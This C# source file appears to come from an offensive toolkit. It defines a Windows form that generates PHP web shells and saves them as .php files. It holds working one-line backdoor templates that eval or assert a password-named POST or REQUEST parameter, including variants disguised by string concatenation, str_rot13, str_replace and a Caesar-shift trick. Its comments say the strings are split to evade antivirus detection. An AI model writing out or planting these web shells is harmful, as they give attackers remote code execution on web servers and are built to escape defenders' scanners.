using C2.Controls;
using C2.Utils;
using System;
using System.Text;
using System.Windows.Forms;

namespace C2.Business.CastleBravo.WebShellTool
{
    partial class TrojanGeneratorForm : StandardDialog
    {
        private string TrojanType { get => this.trojanComboBox.Text.Trim(); }
        private string Password { get => this.passTextBox.Text.Trim(); }
        private string Key { get => this.keyTextBox.Text.Trim(); }
        private string Encry { get => this.encryComboBox.Text.Trim(); }
        public TrojanGeneratorForm(string trojanType, bool encry = false)
        {
            InitializeComponent();
            InitializeComponent2(trojanType, encry); 
        }

        private void InitializeComponent2(string trojanType, bool encry)
        {
            this.trojanComboBox.Text = trojanType;
            this.encryComboBox.Text = "无需配置";
            this.OKButton.Text = "生成";
            if (encry)
            {
                this.keyTextBox.Enabled = true;
                this.keyTextBox.Text = "key";
                this.encryComboBox.SelectedIndex = 0;
                this.encryComboBox.Enabled = true;
            }
        }

        protected override bool OnOKButtonClick()
        {
            this.saveFileDialog1.FileName = this.trojanComboBox.Text;
            this.saveFileDialog1.DefaultExt = ".php";
            if (this.saveFileDialog1.ShowDialog() == DialogResult.OK)
            {
                FileUtil.FileWriteToEnd(this.saveFileDialog1.FileName, GenTrojanContent());
                HelpUtil.ShowMessageBox("成功, 保存: " + this.saveFileDialog1.FileName);
                return base.OnOKButtonClick();
            }
            return false;
        }

        private string GenTrojanContent()
        {
            string ret = TrojanType;
            switch (TrojanType)
            {
                case "PHP通用型一句话Trojan":
                    ret = GenPhpEval(Password);
                    break;
                case "凯撒变种Trojan":
                    ret = GenCaesar(Password);
                    break;
                case "一句话Trojan_变种1":
                    ret = GenOneWord1(Password);
                    break;
                case "一句话Trojan_变种2":
                    ret = GenOneWord2(Password);
                    break;
                case "一句话Trojan_变种3":
                    ret = GenOneWord3(Password);
                    break;
                case "一句话Trojan_变种4":
                    ret = GenOneWord4(Password);
                    break;
                case "一句话Trojan_变种5":
                    ret = GenOneWord5(Password);
                    break;
                case "一句话Trojan_变种6":
                    ret = GenOneWord6(Password);
                    break;
                case "一句话Trojan_变种7":
                    ret = GenOneWord7(Password);
                    break;
                case "一句话Trojan_变种8":
                    ret = GenOneWord8(Password);
                    break;
                case "一句话Trojan_变种9":
                    ret = GenOneWord9(Password);
                    break;
                case "哥斯拉配套Trojan":
                    ret = GenGodzilla(Password);
                    break;
                case "三代冰蝎配套Trojan":
                    ret = GenBehinder3(Password);
                    break;
                default:
                    ret = "暂未实现";
                    break;
            }
            return ret;
        }

        private string GenBehinder3(string password)
        {
            throw new NotImplementedException();
        }

        private string GenGodzilla(string password)
        {
            throw new NotImplementedException();
        }

        private string GenCaesar(string password)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine(@"<?php")
              .AppendLine(@"function lxf($arr){")
              .AppendLine(@"    $arr = stripcslashes($arr);")
              .AppendLine(@"    for($i = 0; $i < strlen($arr); $i++){")
              .AppendLine(@"        $arr[$i] = chr(ord($arr[$i]) - 4);")
              .AppendLine(@"    }")
              .AppendLine(@"    return $arr;")
              .AppendLine(@"}")
              .AppendLine(@"$a = md5('ssss');")
              .AppendLine(@"$b = substr($a, 2, 2) + 37;")
              .AppendLine(@"$s = $b + 18;")
              .AppendLine(@"$e = substr($a, -7, 1);")
              .AppendLine(@"$r = $s - 1;")
              .AppendLine(@"$t = $r + 2;")
              .AppendLine(@"$z = chr($b).chr($s).chr($s).$e.chr($r).chr($t);")
              .AppendLine(string.Format(@"$arr = @lxf($_POST['{0}']);", password))     // 密码替换点
              .AppendLine(@"$z($arr);")
              .AppendLine(@"?>");
            return sb.ToString();
        }

        private string GenPhpEval(string password)
        {
            // 这里为了免杀, 尽量要把Trojan的具体内容拆分开
            // 不然C2会被杀毒干掉
            // <?php @eval($_POST[yxs]);?>
            return string.Format(@"<? p" + @"hp @e" + @"val($_P" + @"OST['{0}" + @"']);?>", password);
        }

  
        private string GenOneWord1(string password)
        {
            // <?php $a=@str_replace(x,'','axsxxsxexrxxt');@$a($_POST['yxs']); ?>
            return string.Format(@"<?ph" + @"p $a=@str_repl" + @"ace(x,'','axsxxs" + @"xexrxxt');@$a($_POS" + @"T['{0}']); ?>", password);
        }
        private string GenOneWord2(string password)
        {
            // <?php $k="ass"."ert"; @$k(${"_PO"."ST"}['yxs']);?>
            return "<? php $k" + " = \"ass\".\"e" + "rt\"; @$k(${\"_PO\"." + "\"ST\"}" + string.Format("['{0}']);?>", password);
        }
        private string GenOneWord3(string password)
        {
            // <?php  $a = "a"."s"."s"."e"."r"."t";  @$a($_POST["yxs"]);  ?>
            return "<?ph" + "p  $a = \"a\".\"s\"." + "\"s\".\"e\"." + "\"r\".\"t\";  @$a($_POST" + string.Format("[\"{0}\"]);  ?>", password);
        }
        private string GenOneWord4(string password)
        {
            // <?php @eval($GLOBALS['_POST']['yxs']); ?>
            return string.Format("<?php @e" + "val($GLOB" + "ALS['_POST" + "']['{0}']); ?>", password);
        }
        private string GenOneWord5(string password)
        {
            // <?php function xm($a){$c=str_rot13('nffreg');$c($a);}xm($_REQUEST['yxs']);?>
            StringBuilder sb = new StringBuilder();
            sb.Append("<?php function xm")
              .Append("($a){$c=str_rot13('nffreg');")
              .Append("$c($a);}xm($_REQUEST")
              .Append(string.Format("['{0}']); ?>", password));
            return sb.ToString();
        }
        private string GenOneWord6(string password)
        {
            throw new NotImplementedException();
        }
        private string GenOneWord7(string password)
        {
            throw new NotImplementedException();
        }
        private string GenOneWord8(string password)
        {
            throw new NotImplementedException();
        }
        private string GenOneWord9(string password)
        {
            throw new NotImplementedException();
        }

    }
}
